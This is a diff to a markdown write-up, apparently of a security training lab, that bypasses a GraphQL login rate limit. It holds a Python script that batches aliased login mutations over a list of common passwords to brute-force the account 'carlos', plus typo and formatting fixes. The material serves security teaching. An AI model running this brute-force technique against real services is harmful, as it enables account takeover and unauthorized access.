@@ -571,10 +571,11 @@ So, we have a mutation and a variable.
 
 We will create  python script to create alias like we neededin above scnerio to bypass passworf limit,
 To get the password of carlos
-**Note**:password are already provided to us
+**Note**: passwords are already provided to us
 
-`passwords = "123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow".split(',')`
-```
+```python
+passwords = "123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow".split(',')
+
 mutations = []
 for index, element in enumerate(passwords):
     mutation = f"""
@@ -588,6 +589,7 @@ for index, element in enumerate(passwords):
 query = "\n".join(mutations)
 print(query)
 ```
+
 We have run script in reptile and we have get the payload
 
 <img width="1350" height="554" alt="image" src="https://github.com/user-attachments/assets/9476cf04-c6cc-44c4-9302-42dd02696140" />
@@ -667,3 +669,4 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
